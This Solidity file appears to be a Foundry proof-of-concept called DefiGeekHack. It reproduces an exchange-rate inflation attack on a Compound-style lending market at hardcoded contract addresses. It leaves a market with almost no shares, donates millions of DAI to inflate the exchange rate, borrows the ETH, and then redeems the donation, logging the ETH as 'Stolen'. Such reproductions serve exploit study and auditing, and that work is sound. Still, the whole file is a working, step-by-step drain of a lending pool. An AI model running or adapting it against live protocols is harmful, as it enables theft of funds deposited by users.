pragma solidity ^0.8.0;

import "../src/flashloan/FlashLoan.sol";
import "../src/reentrancy/Reentrancy.sol";
import "../src/tokens/Tokens.sol";

import "forge-std/interfaces/IERC20.sol";
import "forge-std/console.sol";

interface Unitroller {
    function getAllMarkets() external view returns (address[] memory);
    
    function enterMarkets(address[] memory cTokens)
    external
    returns (uint256[] memory);
}
interface CToken {
    function seize(address liquidator, address borrower, uint seizeTokens) external returns (uint);
    function exchangeRateStored() external view returns (uint);

    function getCash() external view returns (uint);
    function getAccountSnapshot(address account) external view returns (uint, uint, uint, uint);
    function totalSupply() external returns (uint);
    function balanceOf(address account) external returns (uint);
    function mint(uint mintAmount) external returns (uint);
    function borrow(uint256 borrowAmount) external;
    function redeem(uint redeemTokens) external returns (uint);
    function redeemUnderlying(uint redeemAmount) external returns (uint);
}


contract DefiGeekHack is Reentrancy, Tokens {

    CToken constant collateral = CToken(0x08b86E750fF8c816d8af8AC38fc5b67Ae13cd0Cd);     // cDAI
    CToken constant target = CToken(0x6d8260fFf752bA01bCF76C919e9E3D328971152E); // CETHER

    
    // Underlying tokens
    IERC20 constant collateralUnderlying = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);    //DAI

    Unitroller constant unitroller = Unitroller(0xADE98A1a7cA184E886Ab4968e96DbCBEe48D9596);


    function initiateAttack() external {

        //setup balance
        deal(address(collateralUnderlying),address(this),5_000_000*1e18);
        console.log("Assumed collateral balance:", collateralUnderlying.balanceOf(address(this)));

        _executeAttack();
    }

    function _executeAttack() internal override(Reentrancy) {
        
        
        console.log("First step, Deposit a small amount of collateral to the empty pool to obtain shares");
        collateralUnderlying.approve(address(collateral), type(uint256).max);

        collateral.mint(5 * 1e18);
        collateral.redeem(collateral.totalSupply() - 2);
        console.log(
            "Attacker cToken balance:",
            collateral.balanceOf(address(this)),
            "\nUnderlying collateral balance inside the market:",
            collateralUnderlying.balanceOf(address(collateral))
        );
        
        
        console.log(
            "Second step, Donate a large amount of underlying collateral to the pool to inflate the exchangeRate"
        );
        
        (,,, uint256 exchangeRate_1) = collateral.getAccountSnapshot(address(this));
        console.log("collateral exchange rate before inflation: %s",exchangeRate_1);

        uint256 donateAmount = collateralUnderlying.balanceOf(address(this));
        collateralUnderlying.transfer(address(collateral),donateAmount);
        (,,, uint256 exchangeRate_2) = collateral.getAccountSnapshot(address(this));
        
        console.log("cToken exchange rate after inflation: %s",exchangeRate_2);
        

        console.log("Third setp, borrow tokens from the pool to be drained");
        console.log("Native balance of target: ",address(target).balance);
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(collateral);
        unitroller.enterMarkets(cTokens);

        // uint256 borrowAmount = target.getCash() - 1; //cannot borrow everything, because max borrow limit is hit
        uint256 borrowAmount = 10030803797891593553;
        
        target.borrow(borrowAmount);
        console.log("Sucessfully borrowed: ",address(this).balance);


        console.log("Fourth step, redeem the donated underlying tookens. Because of the inflated exchange rate the 1 cToken that is lseft behind has enough value to allow the redemption");
        collateral.redeemUnderlying(donateAmount - 1);
        
        console.log("Underlying balance after redeemUnderlying: ",collateralUnderlying.balanceOf(address(this)));
        console.log("(Stolen) ETH balance: ",address(this).balance);
    }

    function _completeAttack() internal override (Reentrancy) {
        
    }

    function _reentrancyCallback() internal override {
        console.log("Callback hit: ",address(this).balance);
    }

}